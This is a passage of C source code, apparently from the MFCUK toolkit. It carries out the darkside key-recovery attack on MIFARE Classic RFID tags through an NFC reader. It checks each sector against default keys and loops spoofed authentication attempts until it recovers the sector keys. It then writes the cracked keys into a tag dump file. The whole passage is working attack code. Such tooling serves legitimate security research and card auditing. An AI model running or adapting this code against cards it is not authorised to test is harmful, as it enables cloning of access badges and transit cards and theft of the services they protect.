    tag_recover_verify.type = ti.nti.nai.btSak;
    tag_recover_verify.tag_basic.amb[0].mbm.btSAK = ti.nti.nai.btSak;
  }

  // Tag on the reader UID
  tag_on_reader.uid = bswap_32_pu8(ti.nti.nai.abtUid);
  memcpy(tag_on_reader.tag_basic.amb[0].mbm.abtUID, ti.nti.nai.abtUid, MIFARE_CLASSIC_UID_BYTELENGTH);

  // No command line tag UID specified, take it from the tag on the reader
  if (!bfOpts['U']) {
    tag_recover_verify.uid = bswap_32_pu8(ti.nti.nai.abtUid);
    memcpy(tag_recover_verify.tag_basic.amb[0].mbm.abtUID, ti.nti.nai.abtUid, MIFARE_CLASSIC_UID_BYTELENGTH);
  }

  if (bfOpts['v'] && (verboseLevel > 0)) {
    print_mifare_classic_tag_actions("\n\nINITIAL ACTIONS MATRIX", &(tag_recover_verify.tag_basic));
  }

  max_sectors = (IS_MIFARE_CLASSIC_1K(tag_recover_verify.type) ? MIFARE_CLASSIC_1K_MAX_SECTORS : MIFARE_CLASSIC_4K_MAX_SECTORS);

  // VERIFY KEYS CODE-BLOCK
  printf("\nVERIFY: ");
  for (k = keyA; k <= keyB; k++) {
    // Print key-type for which we are looping the sectors for verification
    printf("\n\tKey %c sectors:", 'B' - (keyB - k));

    for (i = 0; i < max_sectors; i++) {
      uint64_t crntVerifKey = 0;
      uint8_t crntVerifTagType = tag_recover_verify.type;
      int crntNumVerifKeys = (bfOpts['D']) ? (numDefKeys) : (1);
      mifare_param mp;

      // Depending on which of keyA or keyB the j value is, the checks and actions below will address exactly that keyA or keyB of current sector
      uint8_t action_byte = ACTIONS_KEY_A + 2 * (1 - (keyB - k));
      uint8_t result_byte = RESULTS_KEY_A + 2 * (1 - (keyB - k));

      printf(" %x", i);
      fflush(stdout);

      // TODO: proper error handling
      block = get_trailer_block_for_sector(crntVerifTagType, i);
      ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

      // If DEFAULT KEYS option was specified, crntNumVerifKeys is already taking care of them
      // Also, perform verification ontly if the sector has been marked for verification of key and not valid verification yet occured in the loop
      for (j = 0; (j < crntNumVerifKeys) && (ptr_trailer->abtAccessBits[action_byte] & ACTIONS_VERIFY) && !(ptr_trailer->abtAccessBits[result_byte] & ACTIONS_VERIFY); j++) {
        // TODO: think of proper mechanism. this is temporary workaround in cases when reader hangs
        mfcuk_save_tag_dump("./snapshot.mfd", &(tag_recover_verify.tag_basic));

        // The first spot in the current_default_keys, is reserved to the key from the loaded dump or from command line
        // If not present (dump or command line), the key of this key-type k for current sector i will be 000000000000
        if (j == 0) {
          memcpy(&(current_default_keys[0][0]), (k == keyA) ? (&(ptr_trailer->abtKeyA[0])) : ((&(ptr_trailer->abtKeyB[0]))), MIFARE_CLASSIC_KEY_BYTELENGTH);
        }

        if (!mfcuk_key_arr_to_uint64(&(current_default_keys[j][0]), &crntVerifKey)) {
          WARN("mfcuk_key_arr_to_uint64() failed, verification key will be %012"PRIx64"", crntVerifKey);
        }

        /*
                // TODO: make this kind of key verification as part of option -a - advanced verification of keys with crapto1 rollback for double verification
                // TEST
                nfc_disconnect(pnd);

                // Try to open the NFC reader
                pnd = nfc_connect(NULL);

                if (pnd == NULL)
                {
                    ERR("connecting to NFC reader");
                    return 1;
                }

                if ( 0 > nfc_initiator_init(pnd) )
                {
                    ERR("initializing NFC reader: %s", nfc_device_get_name(pnd));
                    nfc_disconnect(pnd);
                    return 1;
                }
                // TEST

                uiErrCode = mfcuk_verify_key_block(pnd, crntVerifUID, crntVerifKey, k, crntVerifTagType, block);

                if ( uiErrCode == MFCUK_SUCCESS )
                {
                    // Mark current key-type as verified
                    ptr_trailer->abtAccessBits[result_byte] |= ACTIONS_VERIFY;

                    // Copy default key on top of dump only in case default keys option was specified in command line and the default key matched
                    memcpy( (k==keyA)?(ptr_trailer->abtKeyA):(ptr_trailer->abtKeyB), current_default_keys[j], MIFARE_CLASSIC_KEY_BYTELENGTH);
                }
                else
                {
                    ERR("AUTH sector %d, block %d, key %012"PRIx64", key-type 0x%02x, error code 0x%02x", i, block, crntVerifKey, k, uiErrCode);
                }

                // Reset advanced settings
                mfcuk_darkside_reset_advanced(pnd);
        */
        memcpy(mp.mpa.abtAuthUid, tag_recover_verify.tag_basic.amb[0].mbm.abtUID, MIFARE_CLASSIC_UID_BYTELENGTH);
        memcpy(mp.mpa.abtKey, &(current_default_keys[j][0]), MIFARE_CLASSIC_KEY_BYTELENGTH);

        if (0 >= nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &ti)) {
          ERR("tag was removed or cannot be selected");
        }

        if (0 > nfc_initiator_mifare_cmd(pnd, k, block, &mp)) {
          ERR("AUTH sector %d, block %d, key %012"PRIx64", key-type 0x%02x, error code 0x%02x", i, block, crntVerifKey, k, uiErrCode);
        } else {
          // Mark current key-type as verified
          ptr_trailer->abtAccessBits[result_byte] |= ACTIONS_VERIFY;

          // Copy default key on top of dump only in case default keys option was specified in command line and the default key matched
          memcpy((k == keyA) ? (ptr_trailer->abtKeyA) : (ptr_trailer->abtKeyB), current_default_keys[j], MIFARE_CLASSIC_KEY_BYTELENGTH);
        }
      } // for (j = 0; (j < crntNumVerifKeys); j++)
    } // for (i=0; i<max_sectors; i++)
  } // for (k = keyA; k <= keyB; k++)

  printf("\n");

  if (bfOpts['v'] && (verboseLevel > 0)) {
    print_mifare_classic_tag_actions("\n\nACTION RESULTS MATRIX AFTER VERIFY", &(tag_recover_verify.tag_basic));
  }

  // RECOVER KEYS CODE-BLOCK
  
  printf("\nRECOVER: ");
  for (i = 0; i < max_sectors; i++) {
    uint64_t crntRecovKey = 0;
    ui64KeyRecovered = 0;

    block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
    ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

    printf(" %x", i);
    fflush(stdout);

    for (j = keyA; j <= keyB; j++) {
      // Depending on which of keyA or keyB the j value is, the checks and actions below will address exactly that keyA or keyB of current sector
      uint8_t action_byte = ACTIONS_KEY_A + 2 * (1 - (keyB - j));
      uint8_t result_byte = RESULTS_KEY_A + 2 * (1 - (keyB - j));

      // We have a sector and a key-type of that sector marked for recovery and still the key was not either verified nor recovered
      if ((ptr_trailer->abtAccessBits[action_byte] & ACTIONS_RECOVER) &&
          !(ptr_trailer->abtAccessBits[result_byte] & ACTIONS_VERIFY) &&
          !(ptr_trailer->abtAccessBits[result_byte] & ACTIONS_RECOVER)
         ) {
        // TODO: think of proper mechanism. this is temporary workaround in cases when reader hangs
        mfcuk_save_tag_dump("./snapshot.mfd", &(tag_recover_verify.tag_basic));

        //// TEST
        //// Before starting a new recovery session, disconnect and reconnect to reader and then tag
        //nfc_close(pnd);

        //nfc_init(&context);
        //if (context == NULL) {
        //    ERR("Unable to init libnfc (malloc)");
        //    goto error;
        //}

        //nfc_connstring connstrings[MAX_DEVICE_COUNT];
        //size_t szDeviceFound = nfc_list_devices(context, connstrings, MAX_DEVICE_COUNT);

        //if (szDeviceFound == 0) {
        //    printf("No NFC device found.\n");
        //    nfc_exit(context);
        //    goto error;
        //}
        //pnd = nfc_open(context, connstrings[0]);

        //if (pnd == NULL) {
        //    ERR("Unable to open NFC device: %s", connstrings[0]);
        //    goto error;
        //}
        //if (nfc_initiator_init(pnd) < 0) {
        //    nfc_perror(pnd, "nfc_initiator_init");
        //    nfc_exit(context);
        //    goto error;
        //}

        //printf("NFC device: %s opened\n", nfc_device_get_name(pnd));
        //// TEST

        // Every new recovery session needs this "sort-of" initializing the entries
        memset((void *)arrSpoofEntries, 0, sizeof(arrSpoofEntries));
        numSpoofEntries = 0;
        numAuthAttempts = 0;
        numHit4 = 0;
        memset((void*)hicnt, 0, sizeof(hicnt));
        memset((void*)locnt, 0, sizeof(locnt));

        // Recovery loop for current key-type of current sector
        do {
          mfcuk_darkside_select_tag(pnd, iSleepAtFieldOFF, iSleepAfterFieldON, &ti.nti);

          // Print usefull/useless info (sort-of "Let me entertain you!")
          if (bfOpts['v'] && (verboseLevel > 2)) {
            printf("\n-----------------------------------------------------\n");
            printf("Let me entertain you!\n");
            printf("    uid: %08x\n", tag_recover_verify.uid);
            printf("   type: %02x\n", tag_recover_verify.type);
            printf("    key: %012"PRIx64"\n", crntRecovKey);
            printf("  block: %02x\n", block);
            printf("diff Nt: %d\n", numSpoofEntries);
            printf("   hit4: %d\n", numHit4);
            printf("  auths: %d\n", numAuthAttempts);
            printf("-----------------------------------------------------\n");
          }

          uiErrCode = mfcuk_key_recovery_block(pnd, tag_recover_verify.uid, crntRecovKey, j, tag_recover_verify.type, block, &ui64KeyRecovered);

          if (uiErrCode != MFCUK_OK_KEY_RECOVERED && uiErrCode != MFCUK_SUCCESS && uiErrCode != MFCUK_FAIL_AUTH && weak_mifare_threshold == false) {
            ERR("mfcuk_key_recovery_block() (error code=0x%02x)", uiErrCode);
          }

          mfcuk_darkside_reset_advanced(pnd);

          numAuthAttempts++;
        } while (uiErrCode != MFCUK_OK_KEY_RECOVERED);

        // Store the recovered key A and mark key A for this sector as recovered in results
        ptr_trailer->abtAccessBits[result_byte] |= ACTIONS_RECOVER;

        if (!mfcuk_key_uint64_to_arr(&ui64KeyRecovered, (j == keyA) ? (&(ptr_trailer->abtKeyA[0])) : (&(ptr_trailer->abtKeyB[0])))) {
          WARN("mfcuk_key_uint64_to_arr() failed, recovered key should have been %012"PRIx64"", ui64KeyRecovered);
        }
      }
    } // for (j=keyA; j<=keyB; j++)
  }
  printf("\n");

  if (bfOpts['v'] && (verboseLevel > 0)) {
    print_mifare_classic_tag_actions("\n\nACTION RESULTS MATRIX AFTER RECOVER", &(tag_recover_verify.tag_basic));
  }

  // DUMP DATA CODE-BLOCK
  // TODO: write this code-block
  /*
  for (i=0; i<max_sectors; i++)
  {
      block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
      ptr_trailer = (mifare_classic_block_trailer *) ((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK) );

      //nfc_initiator_mifare_cmd()
  }
  */

  // Clean up and release device
  nfc_close(pnd);
  nfc_exit(context);

  // TODO: think which tag to output and make sure it contains all the retreived data
  // TODO: make this as a function and call it after each key is verified or recovered (because of reader-locking bug)
  if (bfOpts['o']) {
    if (!mfcuk_save_tag_dump(strOutputFilename, &(tag_recover_verify.tag_basic))) {
      ERR("could not save tag dump to '%s'", strOutputFilename);
    } else {
      if (bfOpts['v'] && (verboseLevel > 1)) {
        printf("INFO: saved tag dump file to '%s'\n", strOutputFilename);
      }
    }
  } else if (bfOpts['O']) {
    if (!mfcuk_save_tag_dump_ext(strOutputFilename, &(tag_recover_verify))) {
      ERR("could not save extended tag dump to '%s'", strOutputFilename);
    } else {
      if (bfOpts['v'] && (verboseLevel > 1)) {
        printf("INFO: saved extended tag dump file to '%s'\n", strOutputFilename);
      }
    }
  }

  return EXIT_SUCCESS;

error:
  nfc_close(pnd);
  nfc_exit(context);
  return EXIT_FAILURE;
}
